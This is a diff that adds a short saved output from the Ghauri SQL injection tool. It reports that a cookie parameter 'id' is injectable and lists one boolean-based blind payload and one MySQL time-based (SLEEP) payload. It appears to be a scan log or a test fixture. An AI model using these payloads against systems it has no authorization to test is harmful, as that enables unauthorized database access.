@@ -1,0 +1,12 @@
+Ghauri identified the following injection point(s) with a total of 19 HTTP(s) requests:
+---
+Parameter: id (COOKIE)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ' AND 09205=9205-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (SLEEP)
+    Payload: ' AND SLEEP(9)-- wXyW
+---
+
